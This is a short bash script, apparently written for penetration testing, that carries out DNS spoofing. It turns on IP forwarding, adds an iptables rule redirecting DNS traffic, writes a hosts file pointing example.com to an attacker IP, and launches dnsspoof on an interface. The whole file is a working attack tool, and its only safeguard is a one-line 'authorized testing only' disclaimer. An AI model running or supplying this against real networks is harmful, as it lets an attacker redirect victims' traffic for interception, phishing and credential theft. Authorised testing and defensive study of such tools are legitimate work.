#!/bin/bash
# DNS Spoofing - Redirect DNS queries
# Author: David Osisek
# FOR AUTHORIZED TESTING ONLY

ATTACKER_IP="10.0.0.100"
echo "[+] DNS Spoofing Active"
echo "[*] Redirecting to: $ATTACKER_IP"

# Enable forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Setup iptables
iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53

# Create hosts file
cat > /tmp/spoof_hosts << EOF
$ATTACKER_IP example.com
$ATTACKER_IP www.example.com
EOF

echo "[+] Starting dnsspoof..."
dnsspoof -i eth0 -f /tmp/spoof_hosts
